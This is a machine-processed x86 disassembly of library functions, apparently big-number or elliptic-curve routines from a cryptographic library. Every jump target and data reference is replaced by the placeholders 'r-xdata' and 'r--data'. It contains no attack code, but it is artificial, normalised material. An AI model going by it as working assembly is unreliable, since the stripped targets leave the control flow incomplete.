mov [ esi + 0x8 ] eax
mov [ esi ] 0x2
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] eax
mov ecx [ edi + 0x4 ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
jg r-xdata
call sub_1001e3c0
test eax eax
mov [ edi + 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
dec eax
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov edx [ esi + 0x4 ]
push edx
call sub_1001d740
mov eax [ esi ]
add esp 0x4
cmp eax 0x3
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1001d740
mov ecx [ esi + 0x14 ]
push ecx
call sub_1001d740
mov edx [ esi + 0x18 ]
push edx
call sub_1001d740
add esp 0xc
sub_10061630
push ebp
push esi
mov esi [ esp + 0xc ]
xor ebp ebp
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test ah 0x1
je r-xdata
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
push edi
push ecx
xor ebx ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push esi
push sub_10061740
call sub_10068630
add esp 0x8
pop esi
or eax 0xffffffff
pop ebp
retn
mov ecx [ esi ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov edi [ esi ]
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
xor ebx ebx
push edx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push esi
call eax
add esp 0x4
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
inc ebx
push eax
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov edx [ esi + 0x4 ]
push ebx
push edx
call sub_1001e7c0
push eax
push esi
call [ edi + 0x8 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esi ]
pop edi
pop ebx
mov eax [ edx + 0x14 ]
test eax eax
je r-xdata
mov edi [ esi ]
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov ebp 0xfffffffe
test eax eax
je r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop esi
pop ebp
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax [ esi + 0x4 ]
push ebx
push eax
call sub_1001e7c0
push eax
push esi
call [ edi + 0x10 ]
add esp 0x10
cmp eax 0xffffffff
je r-xdata
xor ebp ebp
pop esi
or eax 0xffffffff
pop ebp
retn
jmp r-xdata
test eax eax
je r-xdata
xor ebp ebp
sub_10061740
mov eax 0x20
call sub_1001d0d0
push edi
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x4 ]
[ edi ]
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x28 ]
mov [ esp + 0x4 ] 0x5
mov [ esp + 0x8 ] eax
mov edx [ ecx ]
pop edi
mov eax [ edx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
add esp 0x20
retn
lea edx [ esp ]
push edx
push ecx
call eax
add esp 0x8
test eax eax
jne r-xdata
or eax 0xffffffff
add esp 0x20
retn
sub_100617b0
mov ecx [ esp + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
dec eax
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x10 ]
retn
sub eax 0x2
je r-xdata
xor eax eax
retn
sub_10061810
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push esi
push edi
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ esp + 0x34 ]
mov esi [ esp + 0x38 ]
not ecx
dec ecx
mov ebx ecx
mov ecx [ edi + 0x14 ]
and ecx 0xfffffffe
test esi esi
mov [ edi + 0x14 ] ecx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x20
retn
mov eax [ esi ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
cmp eax 0x2
jle r-xdata
mov ecx [ esi + 0x10 ]
lea edx [ esp + 0x20 ]
push ecx
push r--data
push 0xd
push edx
call sub_100279b0
mov eax [ esi + 0x14 ]
lea ecx [ esp + 0x20 ]
push eax
push r--data
push 0xd
push ecx
call sub_100279b0
mov eax [ esi + 0x10 ]
add esp 0x20
cmp ebx eax
jge r-xdata
cmp eax 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp ebx eax
jle r-xdata
mov ebp [ edi + 0x14 ]
push 0x352
push r--data
push 0x65
or ebp 0x1
push 0x69
push 0x28
mov [ edi + 0x14 ] ebp
call sub_1001de60
lea edx [ esp + 0x24 ]
push r--data
push edx
lea eax [ esp + 0x3c ]
push r--data
push eax
push r--data
push 0x5
call sub_1001e1a0
add esp 0x2c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
mov ebp [ edi + 0x14 ]
push 0x35a
push r--data
push 0x64
or ebp 0x1
push 0x69
push 0x28
mov [ edi + 0x14 ] ebp
call sub_1001de60
lea ecx [ esp + 0x24 ]
push r--data
push ecx
lea edx [ esp + 0x3c ]
push r--data
push edx
push r--data
push 0x5
call sub_1001e1a0
add esp 0x2c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov [ eax ] 0x0
mov al [ ebp ]
test al al
mov edi ebp
je r-xdata
push 0x370
inc eax
push eax
push ebp
push esi
call sub_100267d0
add esp 0xc
push 0x363
jmp r-xdata
movsx eax [ edi ]
mov ecx [ esi + 0x14 ]
push eax
push ecx
call strchr
add esp 0x8
test eax eax
jne r-xdata
push r--data
push 0x69
push 0x69
push 0x28
call sub_1001de60
add esp 0x14
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0xc ]
pop edi
pop esi
mov al [ ecx ]
pop ebp
mov [ edx ] al
xor eax eax
pop ebx
add esp 0x20
retn
movsx edx [ edi ]
mov eax [ esi + 0x18 ]
push edx
push eax
call strchr
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0xc ]
pop edi
pop esi
mov al [ ecx ]
pop ebp
mov [ edx ] al
xor eax eax
pop ebx
add esp 0x20
retn
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
sub_10061a00
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x48 ]
push eax
call sub_10029990
lea ecx [ esi + 0x70 ]
push ecx
call sub_10029990
lea edx [ esi + 0x84 ]
push edx
call sub_10029990
add esp 0xc
mov [ esi + 0x98 ] 0x0
mov eax 0x1
pop esi
retn
sub_10061a40
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x48 ]
push eax
call sub_100298f0
lea ecx [ esi + 0x70 ]
push ecx
call sub_100298f0
add esi 0x84
push esi
call sub_100298f0
add esp 0xc
pop esi
retn
sub_10061a70
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x48 ]
lea ecx [ edi + 0x48 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esi + 0x70 ]
lea eax [ edi + 0x70 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x84 ]
lea edx [ edi + 0x84 ]
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0x98 ]
mov [ edi + 0x98 ] eax
pop edi
mov eax 0x1
pop esi
retn
pop edi
pop esi
retn
sub_10061ae0
mov eax 0x8
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x18 ]
push edi
xor ebx ebx
push esi
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] ebx
call sub_10029870
add esp 0x4
cmp eax 0x2
jle r-xdata
push 0xb2
push r--data
push 0x67
push 0xa6
push 0x10
call sub_1001de60
add esp 0x14
cmp [ esi + 0x4 ] ebx
jle r-xdata
mov eax [ esi ]
test [ eax ] 0x1
je r-xdata
mov edi [ esp + 0x28 ]
cmp edi ebx
jne r-xdata
push ebp
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov ebp eax
add esp 0x8
cmp ebp ebx
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0xc ] eax
mov edi eax
je r-xdata
push edi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
pop ebp
je r-xdata
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push ecx
lea ebx [ esi + 0x48 ]
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
push 0x0
push ebx
call sub_1002a190
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
push edi
push edx
push eax
push ebp
call sub_100579b0
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x8c ]
test eax eax
je r-xdata
lea eax [ esi + 0x70 ]
push ebp
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
push edi
lea edx [ esi + 0x70 ]
push ebp
push edx
push esi
call eax
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
push edi
lea ebx [ esi + 0x84 ]
push ecx
push edx
push ebx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
push 0x3
push ebp
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
push edi
push ebx
push ebx
push esi
call eax
add esp 0x10
test eax eax
je r-xdata
lea eax [ esi + 0x48 ]
push eax
push ebp
call sub_1002a000
add esp 0x8
mov [ esp + 0x14 ] 0x1
neg eax
sbb eax eax
inc eax
mov [ esi + 0x98 ] eax
sub_10061c80
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
xor edi edi
cmp eax edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
je r-xdata
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x28 ]
cmp ebx edi
jne r-xdata
lea ecx [ esi + 0x48 ]
push ecx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi ]
cmp [ edx + 0x90 ] edi
je r-xdata
cmp ebp edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp ebx edi
je r-xdata
mov edi [ esp + 0x2c ]
test edi edi
jne r-xdata
mov [ esp + 0x14 ] 0x1
cmp ebp edi
je r-xdata
lea ecx [ esi + 0x70 ]
push ecx
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
test ebx ebx
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x10 ] eax
mov edi eax
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
add esi 0x84
push esi
push ebp
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov eax [ esi ]
lea ecx [ esi + 0x70 ]
push edi
push ecx
push ebx
push esi
call [ eax + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ esi ]
lea eax [ esi + 0x84 ]
push edi
push eax
push ebp
push esi
call [ edx + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
sub_10061db0
mov eax 0xc
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x1c ]
xor ebx ebx
cmp esi ebx
mov [ esp + 0xc ] ebx
lea eax [ edi + 0x48 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] eax
jne r-xdata
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
push esi
mov [ esp + 0x30 ] eax
call sub_1002de70
push esi
mov [ esp + 0x38 ] eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
add esp 0x18
test eax eax
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0x10 ] eax
mov esi eax
jne r-xdata
test esi esi
pop ebp
je r-xdata
mov ecx [ edi ]
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
push 0x124
push r--data
push 0x41
push 0xa5
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
push esi
call sub_1002de00
add esp 0x4
lea eax [ edi + 0x70 ]
push eax
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
lea edx [ edi + 0x70 ]
push esi
push edx
push ebx
push edi
call eax
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp ]
add esp 0xc
retn
push eax
call sub_1002dcb0
add esp 0x4
add edi 0x84
push edi
mov edi [ esp + 0x24 ]
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov eax [ edi ]
lea ecx [ edi + 0x84 ]
push esi
push ecx
push edx
push edi
call [ eax + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
mov eax [ edi + 0x4 ]
jne r-xdata
mov edi [ esp + 0x20 ]
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov edi [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
push esi
push edi
push ebx
push ecx
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
mov edx [ esp + 0x24 ]
push esi
push edi
push ebx
push edx
push ebp
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
push 0x2
push ebp
push eax
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
push esi
push edi
push ecx
push ebp
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
push 0x1b
push ebp
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
push esi
push edi
push ebp
push edx
push ebx
call sub_10057a10
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
sub_10061f90
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
call sub_10029990
lea ecx [ esi + 0x18 ]
push ecx
call sub_10029990
lea edx [ esi + 0x2c ]
push edx
call sub_10029990
add esp 0xc
mov [ esi + 0x40 ] 0x0
mov eax 0x1
pop esi
retn
sub_10061fd0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x4 ]
lea ecx [ edi + 0x4 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esi + 0x18 ]
lea eax [ edi + 0x18 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x2c ]
lea edx [ edi + 0x2c ]
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0x40 ]
mov [ edi + 0x40 ] eax
pop edi
mov eax 0x1
pop esi
retn
pop edi
pop esi
retn
sub_10062050
mov eax 0x8
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x28 ]
xor esi esi
cmp edi esi
mov [ esp + 0x8 ] esi
mov [ esp + 0xc ] esi
jne r-xdata
mov eax [ esp + 0x1c ]
push ebx
push ebp
mov ebp [ esp + 0x20 ]
cmp eax esi
mov esi [ esp + 0x1c ]
je r-xdata
call sub_1002dc50
cmp eax esi
mov [ esp + 0x8 ] eax
mov edi eax
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
lea ecx [ esi + 0x48 ]
push edi
lea ebx [ ebp + 0x4 ]
push ecx
push eax
push ebx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x8
retn
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
lea ecx [ esi + 0x48 ]
push edi
lea ebx [ ebp + 0x18 ]
push ecx
push eax
push ebx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
test eax eax
pop ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8c ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
lea ecx [ esi + 0x48 ]
push edi
lea ebx [ ebp + 0x2c ]
push ecx
push eax
push ebx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8c ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
push edi
push ebx
push ebx
push esi
call eax
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0x30 ] 0x1
jne r-xdata
push edi
push ebx
push ebx
push esi
call eax
add esp 0x10
test eax eax
je r-xdata
xor ebp ebp
mov edx [ ebx ]
cmp [ edx ] 0x1
jne r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x40 ] ebp
test ebp ebp
je r-xdata
mov eax [ ebp + 0x38 ]
test eax eax
jne r-xdata
push edi
push ebx
push ebx
push esi
call ecx
add esp 0x10
test eax eax
je r-xdata
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov ebp 0x1
jmp r-xdata
push edi
push ebx
push esi
call eax
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_100621b0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
xor ebp ebp
push edi
mov eax [ esi ]
mov [ esp + 0x10 ] ebp
mov ecx [ eax + 0x90 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
test eax eax
je r-xdata
mov edi [ esp + 0x2c ]
test edi edi
jne r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea edx [ esi + 0x4 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
test eax eax
je r-xdata
call sub_1002dc50
mov ebp eax
test ebp ebp
mov edi ebp
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov ecx [ esi ]
lea edx [ ebx + 0x4 ]
push edi
push edx
push eax
push esi
call [ ecx + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ esp + 0x10 ] 0x1
add esi 0x2c
push esi
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
lea edx [ ebx + 0x18 ]
push edi
push edx
push eax
push esi
call [ ecx + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
test ebp ebp
je r-xdata
push ebp
call sub_1002dcb0
add esp 0x4
mov ecx [ esi ]
add ebx 0x2c
push edi
push ebx
push eax
push esi
call [ ecx + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
sub_100622d0
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
push 0x201
push r--data
push 0x43
push 0xa8
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
test esi esi
je r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_10029810
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
push esi
push edi
push ecx
push edx
call sub_1002d470
add esp 0x18
pop edi
pop esi
retn
sub_10062330
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
push eax
push edi
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov esi [ esp + 0x28 ]
cmp esi ebx
jne r-xdata
push 0x213
push r--data
push 0x6a
push 0xa7
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x8
retn
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov [ esp + 0x38 ] eax
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
add esp 0x14
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0xc ] eax
mov esi eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
pop ebp
je r-xdata
mov ecx [ edi ]
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
mov edx [ esp + 0x20 ]
lea eax [ edx + 0x2c ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
add edx 0x2c
push esi
push edx
push ecx
push edi
call eax
add esp 0x10
test eax eax
je r-xdata
lea ecx [ edi + 0x48 ]
push esi
push ecx
push eax
push ebx
call sub_10036f90
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
jmp r-xdata
mov eax [ edi ]
push esi
mov ecx [ eax + 0x8c ]
test ecx ecx
jne r-xdata
push 0x24e
push r--data
push 0x3
push 0xa7
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
lea eax [ edi + 0x48 ]
push eax
push ebx
push ebp
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
push ebx
push ebp
push edi
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ edi ]
push esi
add ecx 0x4
push ebp
push ecx
push eax
push edi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
add edx 0x4
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
add edx 0x4
push esi
push edx
push ecx
push edi
call eax
add esp 0x10
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ edi ]
push esi
mov ecx [ eax + 0x8c ]
test ecx ecx
jne r-xdata
add edx 0x18
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ edi ]
add edx 0x18
push esi
push edx
push eax
push edi
call [ ecx + 0x90 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
lea eax [ edi + 0x48 ]
push eax
mov eax [ esp + 0x24 ]
push ebx
push ebp
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
push ebx
push ebp
push edx
push edi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
mov ecx [ edi ]
push esi
push edx
mov edx [ esp + 0x30 ]
add eax 0x18
push eax
push edx
push edi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
sub_10062600
mov eax 0x10
call sub_1001d0d0
push ebx
xor ebx ebx
push esi
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
call sub_1001df60
mov esi [ esp + 0x2c ]
cmp esi ebx
jne r-xdata
mov ecx [ esp + 0x28 ]
xor eax eax
cmp ecx ebx
push ebp
push edi
push esi
setne al
mov [ esp + 0x34 ] eax
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
push esi
mov edi eax
call sub_1002de70
push esi
mov [ esp + 0x24 ] eax
call sub_1002de70
add esp 0x14
cmp eax ebx
mov [ esp + 0x1c ] eax
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0xc ] eax
mov esi eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
pop edi
pop ebp
je r-xdata
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x10 ]
push esi
lea ebp [ ebx + 0x48 ]
push ebp
push ecx
push edx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
pop esi
pop ebx
add esp 0x10
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ ebx ]
push esi
mov ecx [ eax + 0x90 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x30 ]
push ebp
push edx
push edi
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
push ecx
push edi
push ebx
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x34 ]
push esi
push ebp
push eax
push edi
push ecx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x34 ]
mov edx [ ebx ]
push esi
push eax
push edi
push ecx
push ebx
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebx + 0x98 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx ]
push esi
mov ecx [ eax + 0x90 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x10 ]
push ebp
push edx
push edi
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea edx [ ebx + 0x70 ]
push ecx
push edx
push edi
push ebx
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
lea edx [ ebx + 0x70 ]
push edx
push edi
push ebx
call ecx
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push ebp
push eax
push edi
push edi
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push ebp
push edi
push eax
push eax
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push ebp
push eax
push edi
push edi
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push ebp
push edi
push eax
push eax
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x34 ]
lea edx [ ebx + 0x84 ]
push ebp
push edx
push eax
push eax
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
lea ecx [ ebx + 0x84 ]
push esi
push ecx
push edi
push ebx
call eax
add esp 0x10
test eax eax
je r-xdata
mov edi [ esp + 0x34 ]
push ebp
push edi
mov edi [ esp + 0x3c ]
push edi
push edi
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
test ecx ecx
jle r-xdata
call sub_1001e020
mov ecx eax
and ecx 0xff000000
cmp ecx 0x3000000
jne r-xdata
jmp r-xdata
xor eax eax
mov edx [ edi ]
test [ edx ] 0x1
je r-xdata
push 0x2d6
push r--data
push 0x3
push 0xa9
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
and eax 0xfff
cmp eax 0x6f
jne r-xdata
push esi
push ebp
push edi
mov edi [ esp + 0x28 ]
